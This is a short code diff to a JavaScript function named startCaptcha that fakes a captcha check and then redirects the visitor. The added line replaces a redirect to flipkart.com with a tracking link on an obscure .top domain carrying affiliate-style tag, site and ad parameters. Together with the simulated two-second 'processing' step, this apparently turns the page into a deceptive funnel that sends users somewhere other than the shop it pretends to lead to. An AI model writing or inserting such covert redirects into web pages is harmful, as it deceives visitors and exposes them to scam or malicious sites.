@@ -22,7 +22,7 @@ function startCaptcha() {
 
         // Redirect to the main site after a delay
         setTimeout(() => {
-            window.location.href = "https://www.flipkart.com/"; // Redirect URL
+            window.location.href = "https://refpa7921972.top/L?tag=d_2749753m_1599c_&site=2749753&ad=1599"; // Redirect URL
         }, 1500); // 1.5 seconds delay before redirect
     }, 2000); // Simulated processing time (2 seconds)
 }
